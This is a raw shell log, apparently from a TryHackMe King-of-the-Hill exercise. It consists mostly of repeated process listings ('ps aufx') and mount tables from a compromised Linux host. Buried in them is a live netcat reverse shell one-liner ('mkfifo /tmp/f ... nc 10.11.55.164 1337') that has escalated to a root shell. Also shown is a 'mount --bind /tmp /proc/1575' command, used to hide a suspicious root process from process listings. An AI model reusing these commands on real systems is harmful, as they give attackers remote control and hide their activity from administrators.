syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.3 106640  3656 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:06 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.1  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:06 /li
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=471976k,nr_inodes=117994,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100684k,mode=755)
/dev/xvda2 on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14822)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core_8689.snap on /snap/core/8689 type squashfs (ro,nodev,relatime,x-gdu.hide)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,size=100680k,mode=700,uid=1003,gid=1003)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
mount --bind /tmp /proc/1575

w
 23:03:24 up 31 min,  0 users,  load average: 0.27, 0.74, 1.34
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       255  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:3]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1589  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:3]
root      1590  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:4]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root         1  0.3  0.8 159864  9012 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.7 127672 17152 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:01 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3400 ?        S    23:00   0:00      |   \_ -i
root      3161  0.0  0.3  37080  3500 ?        R    23:03   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.3 106640  3868 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:06 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.1  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:07 /li
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=471976k,nr_inodes=117994,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100684k,mode=755)
/dev/xvda2 on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14822)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core_8689.snap on /snap/core/8689 type squashfs (ro,nodev,relatime,x-gdu.hide)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,size=100680k,mode=700,uid=1003,gid=1003)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
mount --bind /tmp /proc/1575
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=471976k,nr_inodes=117994,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100684k,mode=755)
/dev/xvda2 on / type ext4 (rw,relatime,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=26,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14822)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core_8689.snap on /snap/core/8689 type squashfs (ro,nodev,relatime,x-gdu.hide)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1003 type tmpfs (rw,nosuid,nodev,relatime,size=100680k,mode=700,uid=1003,gid=1003)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       255  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:3]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1589  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:3]
root      1590  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:4]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root         1  0.3  0.8 159864  9012 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.7 127672 17204 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:02 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3400 ?        S    23:00   0:00      |   \_ -i
root      3261  0.0  0.3  37080  3364 ?        R    23:03   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.3 106640  3868 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
